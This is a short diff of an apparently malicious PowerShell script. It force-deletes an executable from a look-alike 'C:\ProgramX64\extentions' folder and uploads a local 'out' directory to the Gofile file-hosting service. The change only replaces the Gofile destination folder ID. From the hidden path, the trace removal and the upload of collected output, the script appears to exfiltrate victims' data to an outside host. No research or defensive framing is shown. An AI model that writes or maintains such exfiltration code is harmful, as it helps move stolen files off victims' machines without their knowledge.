@@ -52,7 +52,7 @@ Start-Sleep -Milliseconds 20
 Remove-Item -Path "C:\ProgramX64\extentions\evab.exe" -Force
 
 
-Upload-direToGofile -Path "C:\ProgramX64\extentions\out" -newFolderId "95adad47-12b6-47e0-bc26-c895ea8bacb1"
+Upload-direToGofile -Path "C:\ProgramX64\extentions\out" -newFolderId "8e880585-ee8a-4871-a909-529fdfd5704b"
 
 cls
 
